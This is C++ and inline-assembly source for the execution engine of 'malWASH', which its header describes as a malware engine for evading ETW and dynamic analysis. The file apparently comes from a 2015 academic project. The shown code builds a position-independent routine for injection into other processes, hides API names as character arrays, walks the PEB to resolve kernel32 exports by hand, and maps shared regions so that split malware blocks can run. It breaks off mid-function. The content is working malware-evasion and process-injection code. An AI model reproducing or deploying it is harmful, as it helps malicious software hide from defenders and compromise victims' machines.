//-----------------------------------------------------------------------------------------------------------
/*
**	                             ,,                                                        
**	                           `7MM `7MMF'     A     `7MF' db       .M"""bgd `7MMF'  `7MMF'
**	                             MM   `MA     ,MA     ,V  ;MM:     ,MI    "Y   MM      MM  
**	`7MMpMMMb.pMMMb.   ,6"Yb.    MM    VM:   ,VVM:   ,V  ,V^MM.    `MMb.       MM      MM  
**	  MM    MM    MM  8)   MM    MM     MM.  M' MM.  M' ,M  `MM      `YMMNq.   MMmmmmmmMM  
**	  MM    MM    MM   ,pm9MM    MM     `MM A'  `MM A'  AbmmmqMA   .     `MM   MM      MM  
**	  MM    MM    MM  8M   MM    MM      :MM;    :MM;  A'     VML  Mb     dM   MM      MM  
**	.JMML  JMML  JMML.`Moo9^Yo..JMML.     VF      VF .AMA.   .AMMA.P"Ybmmd"  .JMML.  .JMML.
**	               
**
**  malWASH - The malware engine for evading ETW and dynamic analysis: A new dimension in APTs
**
**  ** The execution engine ** - Version 2.0
**
**
**	exec.cpp
**
**	This file contains the execution engine of the malware. There's a single function (executer) that is
**	going to be injected in some processes. Its job is to execute a block of the original malware and then
**	wait until it executes the next block. In order to execute a block in another process address space
**	there's a huge amount of work that we have to do and many many issues that we have to fix before.
**	This code also deals with shared sockets/handles, heap and multi-threading. The executer() function 
**	is not really a function; it contains many functions inside, so the compiler will produce lots of 
**	warnings because we modify ebp register.
**
**  NOTE 1: There are many warnings. Don't worry, they are either warnings for unreferenced labels or
**			for modifying ebp inside executer().
**
**	NOTE 2: For a better view, set tab width to 4
**
**
**	Kyriakos Ispoglou (ispo) - ispo@purdue.edu
**  June - August 2015
*/
//-----------------------------------------------------------------------------------------------------------
#include "stdafx.h"
#include "malwash.h"

// .db is not allowed in inline assembly, so the only solution is to use the pseudoinstruction "_emit". we
// define these MACROs to avoiding having ugly code with multiple _emit. We have MACROs for byte, word, 
// double word, quad word and octa word.
#define B(a)                               { _emit a }
#define W(a,b)                             { _emit a }{ _emit b }
#define D(a,b,c,d)                         { _emit a }{ _emit b }{ _emit c }{ _emit d }
#define Q(a,b,c,d,e,f,g,h)                 D(a,b,c,d) D(e,f,g,h)
#define O(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p) Q(a,b,c,d,e,f,g,h) Q(i,j,k,l,m,n,o,p)
//-----------------------------------------------------------------------------------------------------------
/*
**	executer(): This is the malWASH emulator. This function is going to be injected into another process, in
**		order to execute pieces of the original malware. Thus writing the body of this function, it's like 
**		writing shellcode; We must start from the scratch. No global variables, no references to other seg-
**		ments, no loaded libraries, etc.
**
**		Furthermore, implementing this function in assembly will gives us smaller and optimized code, which
**		is very improntant here, as we execute hundreads of instructions between pieces of original malware.
**		As you'll see in the code, there are some cases that we're not allowed to use specific registers
**		(e.g. ebp, or ecx) and other cases that we're allowed to use only eax. Also it's possible to have
**		ebp modified, which means that we can't reference any local variables of executer(). For all these 
**		reasons, the places that we can write C code are very few and limited.
**
**	Remarks: If our local frame is bigger than a page (4KB) compiler adds a call to chkstk. Thus we'll end
**		up having a call outside of the executer and thus code will crash when we inject it in another pro-
**		cess. If we disable this call, we may cause problems to the execution. So be careful with the size 
**		of local variables (although 4K is more than enough). 
**
**	Argmuments: The prototype of CreateRemoteThread() requires to have a void* pointer as arguments. 
**		However we don't use any arguments.
**
**	Return Value: he prototype of CreateRemoteThread() requires to return a DWORD as status code. However,
**		we ignore the return value and we always return 0.
*/
#pragma runtime_checks( "", off )									// disable _RTC_ function calls 
																	// (they cause problems)
// Ignore these pragmas:
// #pragma function(__alloca_probe, _alloca_probe, _chkstk, chkstk, __chkstk)
// #pragma intrinsic(__alloca_probe, _alloca_probe, _chkstk, chkstk, __chkstk)
// #pragma check_stack(off)
__declspec(safebuffers) ulong __stdcall executer( void *lpParam )	// no canaries between buffers
{ 

// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                        R E A D - O N L Y   D A T A   D E F I N I T I O N S                        || //
// ++===================================================================================================++ //
//
// Let's start with read-only data definitions. Note that if we use constant strings, these strings will 
// be stored in .rdata. However, if we initialize our variables character by character, these constants 
// will be stored within .text in "mov [ebp - 0x????], ch" instructions, where ch is the a character of 
// the constant string.
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //

	// --------------------------------------------------------------------------------------------
	// Start with funcion names that will be imported. All names start with a double underscore
	// --------------------------------------------------------------------------------------------
	char __CreateFileMappingA[]   = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0 },
		 __MapViewOfFileEx[]      = { 'M','a','p','V','i','e','w','O','f','F','i','l','e','E','x', 0 },
		 __UnmapViewOfFile[]      = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0 },
		 __CloseHandle[]          = { 'C','l','o','s','e','H','a','n','d','l','e', 0 },
		 __DuplicateHandle[]      = { 'D','u','p','l','i','c','a','t','e','H','a','n','d','l','e', 0 },
		 __LoadLibraryA[]         = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0 },
		 __GetProcAddress[]       = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s', 0 },
		 __CreateSemaphoreA[]     = { 'C','r','e','a','t','e','S','e','m','a','p','h','o','r','e','A', 0 },
		 __ReleaseSemaphore[]     = { 'R','e','l','e','a','s','e','S','e','m','a','p','h','o','r','e', 0 },
		 __WaitForSingleObject[]  = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t', 0 },
		 __GetCurrentProcessId[]  = { 'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','I','d', 0 },
		 __WSAStartup[]           = { 'W','S','A','S','t','a','r','t','u','p', 0 },
		 __WSADuplicateSocketA[]  = { 'W','S','A','D','u','p','l','i','c','a','t','e','S','o','c','k','e','t','A', 0 },
		 __WSASocketA[]           = { 'W','S','A','S','o','c','k','e','t','A', 0 },
		 __closesocket[]          = { 'c','l','o','s','e','s','o','c','k','e','t', 0 },
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_1_PRELOAD_BLOCKS__
		 __LocalAlloc[]           = { 'L','o','c','a','l','A','l','l','o','c', 0 },
	 	 __LocalFree[]            = { 'L','o','c','a','l','F','r','e','e', 0 },
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_4_SLEEP_BETWEEN_BLK_EXEC__
		 __Sleep[]                = { 'S','l','e','e','p', 0 },
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
		 __CreateThread[]         = { 'C','r','e','a','t','e','T','h','r','e','a','d', 0 },
		 __ExitThread[]           = { 'E','x','i','t','T','h','r','e','a','d', 0 },
		 __SuspendThread[]        = { 'S','u','s','p','e','n','d','T','h','r','e','a','d', 0 },
		 __ResumeThread[]         = { 'R','e','s','u','m','e','T','h','r','e','a','d', 0 },
		 __OpenProcess[]          = { 'O','p','e','n','P','r','o','c','e','s','s', 0 },
		 __PeekMessageA[]         = { 'P','e','e','k','M','e','s','s','a','g','e','A', 0 },
		 __GetCurrentDirectoryW[] = { 'G','e','t','C','u','r','r','e','n','t','D','i','r','e','c','t','o','r','y','W', 0 },
		 __SetCurrentDirectoryW[] = { 'S','e','t','C','u','r','r','e','n','t','D','i','r','e','c','t','o','r','y','W', 0 },
		 __SetCurrentDirectory [] = { 'S','e','t','C','u','r','r','e','n','t','D','i','r','e','c','t','o','r','y', 0 },
		 __GetLastError[]         = { 'G','e','t','L','a','s','t','E','r','r','o','r', 0 },
		 __SetLastError[]         = { 'S','e','t','L','a','s','t','E','r','r','o','r', 0 },
		 __printf[]               = { 'p','r','i','n','t','f', 0 },
		 __GetCommandLineW[]      = { 'G','e','t','C','o','m','m','a','n','d','L','i','n','e','W', 0 },
		 __ExitProcess[]          = { 'E','x','i','t','P','r','o','c','e','s','s', 0},
		 __CreateFileA[]          = { 'C','r','e','a','t','e','F','i','l','e','A', 0 },
		 __WriteFile[]            = { 'W','r','i','t','e','F','i','l','e', 0 },
		 __SetFilePointer[]       = { 'S','e','t','F','i','l','e','P','o','i','n','t','e','r',0 },

		 /* -------------------- Call dependencies -------------------- */
		 __bind[]                = { 'b','i','n','d', 0 },
		 __listen[]              = { 'l','i','s','t','e','n', 0 },
		 __accept[]              = { 'a','c','c','e','p','t', 0 },

		 __CreateProcessW[]      = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','W', 0 },
		 __GetStartupInfoW[]     = { 'G','e','t','S','t','a','r','t','u','p','I','n','f','o','W', 0 },
		 /* -------------------- FILE* replacements -------------------- */
		 __fopen[]               = { 'f','o','p','e','n', 0 },
		 __fputs[]               = { 'f','p','u','t','s', 0 },
		 __fputc[]               = { 'f','p','u','t','c', 0 },
		 __fclose[]              = { 'f','c','l','o','s','e', 0 }
			;

	// --------------------------------------------------------------------------------------------
	// Continue with other various constants
	// --------------------------------------------------------------------------------------------
	char globalnam[] = { 'G','l','o','b','a','l','\\', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 },
		 ctrlnam[]   = { 'C','o','n','t','r','o','l','R','e','g','i','o','n', 0 },
		 ctrlsem[]   = { 'C','o','n','t','r','o','l','A','c','c','e','s','s','1', 0, 0,	// 16-chars exactly
						 'C','o','n','t','r','o','l','A','c','c','e','s','s','2', 0, 0,
						 'C','o','n','t','r','o','l','A','c','c','e','s','s','3', 0, 0,
						 'C','o','n','t','r','o','l','A','c','c','e','s','s','4', 0, 0 },
		 detournam[] = { 'D','e','t','o','u','r','R','e','g','i','o','n', 0 }, 
		 ws2_32[]    = { 'w','s','2','_','3','2','.','d','l','l', 0 },					// our dlls
		 user32[]    = { 'u','s','e','r','3','2','.','d','l','l', 0 },
		 msvcrt[]    = { 'm','s','v','c','r','t','.','d','l','l', 0 },
		 
		 // NOTE: If you add more threads, you must add more stack names 
		 shstack[]   = { 'S','h','a','r','e','d','S','t','a','c','k','1', 0,
						 'S','h','a','r','e','d','S','t','a','c','k','2', 0,
					 	 'S','h','a','r','e','d','S','t','a','c','k','3', 0,
						 'S','h','a','r','e','d','S','t','a','c','k','4', 0 },
	
		// Although the splitting idea is wonderful, some things are inherently wrong. For example,
		// when original malware accessing itself which file we should really open? It's stupid to
		// carry the original malware binary, so in some cases it's better to open a dummy file 
		// instead. This is not actually needed anywhere
		cmdlineargs[] = { 'C',0,':',0,'\\',0,'c',0,'m',0,'d',0,'.',0,'e',0,'x',0,'e',0, 0,0 }
			;

//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
// uncomment the line below, if you want to crash in remote process :P
// #ifdef __VAR_6_DISPLAY_VERBOSE_INFO__

	// --------------------------------------------------------------------------------------------
	// These constants used to display state information during execution (DEBUG ONLY)
	// --------------------------------------------------------------------------------------------
	char outbuf[]  = { 'd','o','n','e','\n', 0 },
		 errbuf[]  = { 'E','r','r','o','r',' ','C','o','d','e','s',':',' ','%','x','\t','%','x','\n', 0 },
		 fmtstr[]  = { 'N','e','x','t','.',' ','T','h','r','e','a','d',' ','%','x',',',
										   ' ','B','l','o','c','k',' ','%','3','d','\n', 0 },
		 sucbuf[]  = { 'P','r','o','g','r','a','m',' ','F','i','n','i','s','h','e','d',' ',
					           'S','u','c','c','e','s','s','f','u','l','l','y','.','\n', 0 };
// #endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                                   L O C A L   V A R I A B L E S                                   || //
// ++===================================================================================================++ //
//
// Declare the local variables than executer needs
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //

	// --------------------------------------------------------------------------------------------
	// Declare function pointers first
	// --------------------------------------------------------------------------------------------
	void* (__stdcall *CreateFileMappingA) (void*, void*, ulong, ulong, ulong, char*)             ;
	void* (__stdcall *MapViewOfFileEx)    (void*, ulong, ulong, ulong, ulong, void*)             ;
	void* (__stdcall *UnmapViewOfFile)    (void*)	                                             ;
	bool  (__stdcall *CloseHandle)        (void*)                                                ;
	void* (__stdcall *LoadLibraryA)       (char*)	                                             ;
	void* (__stdcall *GetProcAddress)     (void*, char*)                                         ;
	void* (__stdcall *CreateSemaphoreA)   (void*, long int, long int, char *)	                 ;
	void* (__stdcall *ReleaseSemaphore)   (void*, long int, long int*)                           ;
	void* (__stdcall *WaitForSingleObject)(void*, ulong)                                         ;
	void* (__stdcall *WSAStartup)         (ushort, void*)                                        ;
	void* (__stdcall *WSASocketA)         (int, int, int, void*, ulong, ulong)                   ;
	int   (__stdcall *closesocket)        (void*)                                                ;
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_1_PRELOAD_BLOCKS__
	void* (__stdcall *LocalAlloc)         (void*, ulong, ulong)                                  ;
	bool  (__stdcall *LocalFree)          (void*, ulong, void*)                                  ;
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_4_SLEEP_BETWEEN_BLK_EXEC__
	void  (__stdcall *Sleep)              (ulong)                                                ;
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
	void  (__stdcall *ExitThread)         (ulong)                                                ;
	int   (__stdcall *GetLastError)       ()                                                     ;
	bool  (__stdcall *PeekMessageA)       (void*, void*, uint, uint, uint)                       ;
	ulong (__stdcall *GetCurrentDirectory)(ulong, void*)                                         ;
	bool  (__stdcall *SetCurrentDirectory)(void*)                                                ;
	void  (__stdcall *SetLastError)       (ulong)                                                ;
	int   (__cdecl   *myprintf)			  (const char * format, ...)                             ;
	void* (__stdcall *CreateFileA)        (const char*, ulong, ulong, void*, ulong, ulong, void*);
	bool  (__stdcall *WriteFile)          (void*, const void*, ulong, ulong*, void*)             ;
	ulong (__stdcall *SetFilePointer)     (void*, long, ulong*, ulong)                           ;

	//-------------------------------------------------------------------------------------------------------
	// continue with local variables
	//-------------------------------------------------------------------------------------------------------
	shctrl_t	*loctrl;								// pointer to shared control region
	void		*hCtrlFile;								// object handle for control region
	byte		*blk;									// RVA of next block to be executed
	uint		nxtthrd = 0;							// next thread to execute (only for multi-threading)
	void		*sem[ NMAXTHREADS ];					// control semaphores (per thread)
	ulong		lasterror = 0;							// last error code (from malware)
	ulong	errcode;									// possible error code (0 on success) (from malWASH)

	struct segmptr_t {									// loaded segment information
		void	*base,									// base RVA
				*hdl;									// open handle to this segment (object)
	} segmptr[ SEGMTABSIZE ];							// 1 entry for each segment
	
	typedef struct tagPOINT {							// point structure
		long int x, y;									// x and y coordinates
	} POINT, *PPOINT;

	typedef struct tagMSG {								// message structure (needed for PeekMessasge)
		void*		hwnd;
		uint		message;							// we're only interested in this
		uint*		wParam;
		long int	*lParam;
		ulong		time;
		POINT		pt;
	} msg;												// potential incoming message

//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_2_USE_FUNCTION_POINTER_TABLE__

	void	*fptab[MAXBLKNFUNC];						// function pointer table
	uint	fptabcnt = 0;								// and its counter

#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_1_PRELOAD_BLOCKS__

	//-------------------------------------------------------------------------------------------------------
	//	We have another problem here: If we declare blkaddr and blkoff as locals (store them in stack) then
	// local stack frame will be >1 page (4KB). This means that chkstk() wil be called and a segfault will 
	// follow. So we must move them to the heap.
	//
	//		void	*blkaddr[MAXNBLKS];					// block base address table
	//		void	*blkoff[MAXNBLKS];					// offset of the real code withing th block
	//-------------------------------------------------------------------------------------------------------
	void	**blkaddr, **blkoff;						// block base address and offset within block
#else
	void	*blk2,										// it's like of blk
			*hBlkFile;									// object handles for next block 
	char	*ptrnam;									// shared name of the next block
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                   E B P - I N D E P E N D E N T   L O C A L   V A R I A B L E S                   || //
// ++===================================================================================================++ //
//
// Functions for duplicating SOCKETs/HANDLEs will be called during the execution of basic block. Thus
// ebp will be different and we won't be able to reference local variables. Restoring original ebp is an
// option but sometimes not the best. By storing locals under labels we make them ebp-aware and we can 
// reference them without the use of ebp. Let's see an example:
//
//	[to read loctrl_backup]:
//		lea		esi, ds:[loctrl_backup]				// ebp is invalid. Find loctrl from this way ;)
//		mov		esi, [esi]							// esi = loctrl
//
//  [to set loctrl_backup]:
//		mov		dword ptr ds:[loctrl_backup], eax	// in no-ebp flavor also	
// 
// Although this is correct, it makes code non-PIE, because compiler replaces loctrl_backup with its
// absolute address. Having a non-PIE code will end up in SIGSEGV when we inject it in another process
// address space at a random base address.
//
// The solution here is to use the same ebp-aware "local storage", but using relative addresses instead
// of locals. We have to do some nasty tricks though ;)
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
	
	//-------------------------------------------------------------------------------------------------------
	// Start of no-ebp variable declarations
	//-------------------------------------------------------------------------------------------------------
	__asm {
			jmp		skip_noebp_decls					// skip local variable declarations
		// ----------------------------------------------------------------------------------------
		// because we're going to use loctrl_backup a lot, we'll make read/write functions for it:
		// ----------------------------------------------------------------------------------------
		loctrl_backup_rd:								// save here loctrl pointer
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction			
			pop esi										// get current address
			mov esi, [esi + 0x14]						// our value is 20 bytes below
			retn										// return
		// ------------------------------------------------------------------------------------
		loctrl_backup_wrt:								// write using 1 register only! 
			// The challenge: Do an indirect write using only 1 register. Keep in mind that 
			// only 1 operand can be a memory reference (this: mov [eax], [ebx] is not allowed)
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			add		[esp], 0xa							// return value is on top of stack.
			xchg	dword ptr[esp], eax					// swap return value with desired value
			pop		dword ptr[eax]						// store desired value
			retn										// return
														//
			D(0x00, 0x00, 0x00, 0x00)					//	this is the actual storage for loctrl_backup
		// ----------------------------------------------------------------------------------------
		// for the rest, we use a function that return the entry point of the local storage
		// and we replace the label with constant offsets. esi and eax are the registers
		// with the minimum usage in the code. In some cases both registers are already used
		// so, we have to push and pop that register.
		// ----------------------------------------------------------------------------------------
		get_noebp_local_storage_esi:					// save here loctrl pointer
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop esi										// get current address
			lea esi, [esi + 0xf]						// our value is 20 bytes below
			retn										// return
		// ------------------------------------------------------------------------------------
		get_noebp_local_storage_eax:					// save here loctrl pointer
 			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction			
			pop eax										// get current address
			lea eax, [eax + 0x5]						// our value is 5 bytes below
			retn										// return
			// ------------------------------------------------------------------------------------
			// that's the actual local storage
			// ------------------------------------------------------------------------------------
			D(0x00, 0x00, 0x00, 0x00)					// store original ebp
			D(0x00, 0x00, 0x00, 0x00)					// store pid
			D(0x00, 0x00, 0x00, 0x00)					// store pid index
			D(0x00, 0x00, 0x00, 0x00)					// store current process handle
			D(0x00, 0x00, 0x00, 0x00)					// store &WSADuplicatesocket()
			D(0x00, 0x00, 0x00, 0x00)					// store &DuplicateHandle()
			D(0x00, 0x00, 0x00, 0x00)					// store &OpenProcess()
			D(0x00, 0x00, 0x00, 0x00)					// store &CloseHandle()
			D(0x00, 0x00, 0x00, 0x00)					// store &MapViewOfFileEx()
			D(0x00, 0x00, 0x00, 0x00)					// store &CreateProcesW()
			D(0x00, 0x00, 0x00, 0x00)					// store &GetStartupInfoW()
			D(0x00, 0x00, 0x00, 0x00)					// store &bind()
			D(0x00, 0x00, 0x00, 0x00)					// store &listen()
			D(0x00, 0x00, 0x00, 0x00)					// store &accept()
			D(0x00, 0x00, 0x00, 0x00)					// store base address of block entry point
			D(0x00, 0x00, 0x00, 0x00)					// reserved
			// and finally a string...
			O('G','l','o','b','a','l','\\', 0, 0, 0, 0, 0, 0, 0, 0, 0) 
			// ------------------------------------------------------------------------------------
			// define the constant offsets within local storage to make coding easier
			// ------------------------------------------------------------------------------------
			#define noebp_origebp				0x00
			#define noebp_pid					0x04
			#define noebp_pididx				0x08
			#define noebp_prochandle			0x0c
			#define noebp_WSADuplicateSocketA	0x10
			#define noebp_DuplicateHandle		0x14
			#define noebp_OpenProcess			0x18
			#define noebp_CloseHandle			0x1c
			#define noebp_MapViewOfFileEx		0x20
			#define noebp_CreateProcessW		0x24
			#define noebp_GetStartupInfoW		0x28
			#define noebp_bind					0x2c
			#define noebp_listen				0x30
			#define noebp_accept				0x34
			#define noebp_blk_prolog_baseaddr	0x38
			#define noebp_reserved				0x3c
			#define noebp_global				0x40
			// ------------------------------------------------------------------------------------
		skip_noebp_decls:								// jump here
			nop											// do nothing
	}
	//-------------------------------------------------------------------------------------------------------
	// end of data
	//-------------------------------------------------------------------------------------------------------


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                C O D E   S E G M E N T   S T A R T   -   C O R E   R O U T I N E S                || //
// ++===================================================================================================++ //
//
// Below are the core routins of the emulatoer (malWASH):
//   [1]. getprocaddress() : Get a procedure's address from kernel32.dll
//   [2]. attachreg()      : Attach a shared region to the current address space
//   [3]. block_prolog()   : Do all required block relocations
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //

	//-------------------------------------------------------------------------------------------------------
	// code starts from here
	//-------------------------------------------------------------------------------------------------------
	__asm {
			jmp main									// jump to main (skip all function definitions)
	}
	//-------------------------------------------------------------------------------------------------------
	// getprocaddr(): An inline implementation of kernel32.dll GetProcAddress() function. getprocaddr() lookup
	//		a function in kernel32's EAT. The search is done by name, and the entry point of the requested 
	//		function is returned. If function not found, function returns -1.
	//
	// Arguments (fastcall): ecx (char*) : a pointer to the requested function name
	//
	// Return Value: Function address. If function not found, -1 is returned.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		getprocaddr:									// function label
			push	ebp									// create a stack frame
			mov		ebp, esp							//
			sub		esp, 0x20							// 32 bytes seem enough
			push	ebx									// backup registers
			push	edx									//
			push	esi									//
			push	edi									//
														//
			mov		[ebp-4], ecx						// loc4 = arg1
			// --------------------------------------------------------------------------
			// find length of user's function name
			// --------------------------------------------------------------------------
			xor		eax, eax							// set al to NULL
			mov		edi, ecx							// edi must contain the string address
			xor		ecx, ecx							//
			not		ecx									// set ecx to -1
			cld											// clear Direction Flag (++ mode)
			repne scasb									// iterate over string until you find NULL
			neg		ecx									// toggle, and ecx will contain strlen+2 (+2 is needed)
														//
			mov		[ebp-8], ecx						// loc8 = strlen(arg1)
			// --------------------------------------------------------------------------
			// locate base address of kernel32.dll (generic - without InInitializationOrderModuleList)
			// --------------------------------------------------------------------------
			mov		eax, fs:[0x30]						// get PEB
			mov		eax, [eax + 0x0c]					// PEB->Ldr (PEB_LDR_DATA)
			mov		eax, [eax + 0x14]					// PEB->Ldr.InMemoryOrderModuleList.Flink
			mov		eax, [eax]							// skip 1st entry (module itsel)
			mov		eax, [eax]							// skip 2nd entry (ntdll.dll)
			mov		ebx, [eax + 0x10]					// kernel32 module base address in ebx
			// mov		[ebp - 1c], ebx					// base address in stack
			// --------------------------------------------------------------------------
			// locate important parts of kernel32's EAT
			// --------------------------------------------------------------------------
			mov		ecx, [ebx + 0x3c]					// ebx->e_lfanew: skip MSDOS header of kernel32.dll 
			mov		edx, [ebx + ecx + 78h]				// get export table RVA (it's 0x78 bytes after PE header)
			add		edx, ebx							// convert it to absolute address (edx = EAT)
														//
			mov		ecx, [edx + 0x18]					// get number of exported functions
			mov		esi, [edx + 0x1c]					// & of AddressOfNamess table
			mov		edi, [edx + 0x24]					// & of AddressOfNameOrdinals table
			mov		edx, [edx + 0x20]					// & of AddressOfFunctions table
			add		edx, ebx							// convert it to absolute address
														//
			mov		[ebp - 0xc], esi					// locc  = &AddressOfNames
			mov		[ebp - 0x10], edi					// loc10 = &AddressOfNameOrdinals
			// --------------------------------------------------------------------------
			// iterate over EAT until you find the requested function
			// --------------------------------------------------------------------------
		get_next_funnam:								//
			jecxz	search_failed						// reach the end of table?
			dec		ecx									// decrease counter
			mov		esi, [edx + ecx*4]					// get function's name RVA
			add		esi, ebx							// convert it to absolute address
			// --------------------------------------------------------------------------
			// compare the 2 strings
			// --------------------------------------------------------------------------
			push	ecx									// back up ecx
			xor		eax, eax							// clear eax
			mov		edi, [ebp - 4]						// edi = arg1
			mov		ecx, [ebp - 8]						// ecx = strlen(arg1)
			dec		esi									// 
			dec		edi									// decrease, because we'll increase later
		strcmp_loop:									//
			inc		esi									// funnam++
			inc		edi									// arg1++
														//
			mov		al, byte ptr [esi]					// 
			cmp		al, byte ptr [edi]					// *funnam == *arg1 ?
			loope	strcmp_loop							// if yes get next character
														//
			test	ecx, ecx							// reach NULL ? (we need to compare also the NULL bytes)
			pop		ecx									// restore old ecx
			jne		get_next_funnam						// if match not found, get next funnam from EAT
			// --------------------------------------------------------------------------
			// if you reach this point, match found
			// --------------------------------------------------------------------------
			mov		edx, [ebp-0x10]						// &AddressOfNameOrdinals
			add		edx, ebx							// convert it to absolute address
			shl		ecx, 1								// counter *= 2 (because ordinals are 2 bytes)
			add		edx, ecx							//
			movzx	ecx, word ptr[edx]					// ecx = AddressOfNameOrdinals[counter << 1]
														// ecx has the right ordinal
			mov		esi, [ebp-0xc]						// &AddressOfNames
			add		esi, ebx							// convert it to absolute address
			shl		ecx, 2								// because addresses are 4 bytes
			add		esi, ecx							// get the right slot
			mov		eax, [esi]							// AddressOfNames[ AddressOfNameOrdinals[counter*2]*4 ]
			add		eax, ebx							// convert from RVA to absolute address
			jmp		getprocaddr_end						// return
			// --------------------------------------------------------------------------
			// finalize
			// --------------------------------------------------------------------------
		search_failed:									//
			mov		eax, 0xffffffff						// return -1
		getprocaddr_end:								//
			pop		edi									// restore registers
			pop		esi									//
			pop		edx									//
			pop		ebx									//
			add		esp, 0x20							// release stack space
			leave										// function epilog
			retn										//
	}
	//-------------------------------------------------------------------------------------------------------
	// attachreg(): Attach a shared region to current thread. 
	//
	// NOTE: Because all references are local, if we change ebp, then all offsets will change. Thus we can't
	//	modify ebp. All job will be done through esp.
	// 
	// Arguments (fastcall): ecx     (char*) : a pointer to a string containing the shared region to attach
	//                       edx     (uint)  : size of the shared region
	//                       [esp+4] (void*) : predefined base address (NULL if we don't care about base
	//                                         address)
	//
	// Return Value: Function returns 2 values: eax contains shared region address and edx a handle to a file 
	//	mapping object. In case of an error, eax will be -1, and edx undefined.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		attachreg:										// function label
														// don't use a stack frame pointer (no function prolog)
			// sub		esp, 0x8						// 8 bytes seem enough
			push	esi									// backup registers
			push	edi									// 
			// --------------------------------------------------------------------------
			// concatenate shared region name with "Global\\"
			// --------------------------------------------------------------------------
			lea		edi, [globalnam + 7]				// address of NULLs after "Global\\"
			mov		esi, ecx							// address of shared region name
			cld											// clear Direction Flag (++ mode)
		attachreg_copynxt:								// our strcat() :)
			lodsb										// get a character from esi++ to al
			stosb										// store al to edi++
			test	al, al								// NULL byte reached?
			jne		attachreg_copynxt					// if not continue copying
			// --------------------------------------------------------------------------
			// attach shared region to current thread
			// --------------------------------------------------------------------------
			push	edx									// backup arg2 (CreateFileMapping will tamper edx)
			sub		esp, 0x18							// reserve space for stack (we can use "push" instead)
			lea		ecx, [globalnam]					//
			mov		dword ptr [esp + 0x14], ecx			// lpName: & of global name
			mov		dword ptr [esp + 0x10], edx			// dwMaximumSizeLow: arg2
			mov		dword ptr [esp + 0xc], 0			// dwMaximumSizeHigh: 0
			mov		dword ptr [esp + 0x8], 0x04			// flProtect: PAGE_READWRITE
			// --------------------------------------------------------------------------
			// in case of const_detour() copy, region must be +X
			// --------------------------------------------------------------------------
			cmp		dword ptr[esp + 0x10 + 0x18], DUPDETOURADDR	// lpBaseAddress == DUPDETOURADDR?
			jnz		attachreg_non_exec					//
														//
